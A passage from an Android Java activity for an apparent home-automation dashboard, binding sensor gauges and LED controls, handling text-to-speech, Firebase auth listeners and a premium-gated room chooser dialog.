                    Toast.makeText(getApplicationContext(),"Acceso denegado",Toast.LENGTH_LONG).show();
                    descarga.dismiss();
                }
                return;
            }

        }
    }*/


    private void ids() {
        swipeRefreshLayout = findViewById(R.id.swipeRefreshLayout);

        sensorsLabel = findViewById(R.id.sensorsLabel);

        premi = findViewById(R.id.premiumBox);

        pir = findViewById(R.id.valorMovement);
        fechaConexion = findViewById(R.id.lastConx);

        consignaLabel = findViewById(R.id.consigna_value);
        comfortLabel = findViewById(R.id.comfortMode);
        fanLabel = findViewById(R.id.fanValue);

        valor_cama = findViewById(R.id.valor_cama);
        valor_mesa = findViewById(R.id.valor_mesa);
        valor_up = findViewById(R.id.valor_up);

        rojosState = findViewById(R.id.rojosStatus);
        verdesState = findViewById(R.id.verdesStatus);
        blanco_rState = findViewById(R.id.blancorStatus);
        blanco_lState = findViewById(R.id.blancolStatus);
        blanco_cState = findViewById(R.id.blancocStatus);

        labelLeds = findViewById(R.id.textView17);

        iluminacionBar = findViewById(R.id.light1);
        ledsBar = findViewById(R.id.ledsBar);
        intuderBar = findViewById(R.id.intruderBars);
        graphBar = findViewById(R.id.graphBars);

        gaugeExterior = findViewById(R.id.gaugeExt);
        gaugeInterior = findViewById(R.id.gaugeInt);
        gaugeLuxInt = findViewById(R.id.gaugeLux);

        gaugeHumidity = findViewById(R.id.gaugeHumidity);
        gaugeHeatIndex = findViewById(R.id.gaugeHeatIndex);

        gaugeRojos = findViewById(R.id.gaugeRojos);
        gaugeVerdes = findViewById(R.id.gaugeVerdes);
        gaugeBlancoR = findViewById(R.id.gaugeBlancoR);
        gaugeBlancoL = findViewById(R.id.gaugeBlancoL);
        gaugeBlancoC = findViewById(R.id.gaugeCama);

        temp_interior = findViewById(R.id.textView29);
        temp_exterior = findViewById(R.id.textView30);
        lux_int = findViewById(R.id.luxValue);
        humidityLabel = findViewById(R.id.textView33);
        heatIndexLabel = findViewById(R.id.textView35);

        modoLeds = findViewById(R.id.modoLeds);

        navigationView = findViewById(R.id.navview);

        camaAuto = findViewById(R.id.autoCamaSwitch);
        mesaAuto = findViewById(R.id.autoMesaSwitch);
        upAuto = findViewById(R.id.autoUpSwitch);
    }

    private void speak(String msg){
        Voice voiceobj = new Voice("it-it-x-kda#male_2-local", Locale.getDefault(), 1, 1, false, null);
        t2s.setVoice(voiceobj);
        t2s.setPitch(1);
        t2s.setSpeechRate(1);
        t2s.speak(msg,TextToSpeech.QUEUE_FLUSH, null,null);
    }

    @Override
    public void onBackPressed() {

        AlertDialog.Builder salir = new AlertDialog.Builder(MainActivity.this);
        salir.setTitle(R.string.salir);
        salir.setMessage(R.string.seguro);
        salir.setPositiveButton(R.string.aceptar, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                finish();
            }
        }).setNegativeButton(R.string.cancelar, null)
                .setIcon(android.R.drawable.ic_menu_close_clear_cancel);
        salir.create();
        salir.show();
    }

    @Override
    protected void onStart() {
        super.onStart();
        mAuth.addAuthStateListener(firebaseAuthListener);
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (firebaseAuthListener != null) {
            mAuth.removeAuthStateListener(firebaseAuthListener);
        }
    }

    private void actividad(Class<?> clase, Boolean flag) {
        if (flag) {
            startActivity(new Intent(MainActivity.this, clase));
        } else {
            Toast.makeText(getApplicationContext(), "Opción premium", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {

    }

    public void showCustomDialog(){
        dialog = new Dialog(MainActivity.this);
        dialog.setContentView(R.layout.chooseroomframe);
        room = dialog.findViewById(R.id.roomButton);
        exterior = dialog.findViewById(R.id.exteriorButton);
        living = dialog.findViewById(R.id.livingButton);
        stand = dialog.findViewById(R.id.casetaButton);

        room.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(premi.isChecked()){
                    startActivity(new Intent(MainActivity.this,Iluminacion.class));
                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
                    dialog.dismiss();
                }else{
                    Toast.makeText(getApplicationContext(),"Opción premium",Toast.LENGTH_SHORT).show();
                }
            }
        });
        exterior.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(premi.isChecked()){
                    startActivity(new Intent(MainActivity.this,EntradaActivity.class));
                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
                    dialog.dismiss();
                }else{
                    Toast.makeText(getApplicationContext(),"Opción premium",Toast.LENGTH_SHORT).show();
                }
            }
        });
        living.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(premi.isChecked()){
                    startActivity(new Intent(MainActivity.this,SalitaActivity.class));
                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
                    dialog.dismiss();
                }else{
                    Toast.makeText(getApplicationContext(),"Opción premium",Toast.LENGTH_SHORT).show();
                }
            }
        });
        stand.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(premi.isChecked()){
                    startActivity(new Intent(MainActivity.this,StandActivity.class));
                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
                    dialog.dismiss();
                }else{
                    Toast.makeText(getApplicationContext(),"Opción premium",Toast.LENGTH_SHORT).show();
                }
            }
        });
        dialog.show();
    }

    @Override
    protected void onDestroy() {
        if(t2s != null){
            t2s.stop();
            t2s.shutdown();
        }
        super.onDestroy();
    }
}

